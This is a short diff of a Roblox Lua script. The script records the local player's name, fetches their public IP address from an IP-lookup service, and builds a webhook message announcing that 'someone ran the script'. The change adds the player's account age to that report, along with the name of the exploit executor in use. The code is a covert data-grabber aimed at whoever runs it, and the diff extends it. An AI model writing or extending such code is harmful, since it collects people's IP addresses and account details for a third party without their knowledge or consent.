@@ -3,13 +3,15 @@ local plrname = game.Players.LocalPlayer.Name
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+Parent = game.Workspace
+local Day = game.Players.LocalPlayer.AccountAge
 local PlayerData =
 {
        ["content"] = "@everyone **Someone Run The Script**",
        ["embeds"] = {
            {
-           ["title"] = "Name: "..plrname,
-           ["description"] = "Execute is: ".. identifyexecutor(),
+           ["title"] = "Name: "..plrname .. " Create Day: "..Day,
+           ["description"] = "**Execute is: **".. identifyexecutor(),
            ["color"] = tonumber(0x00FF00),
            ["fields"] = {
                {
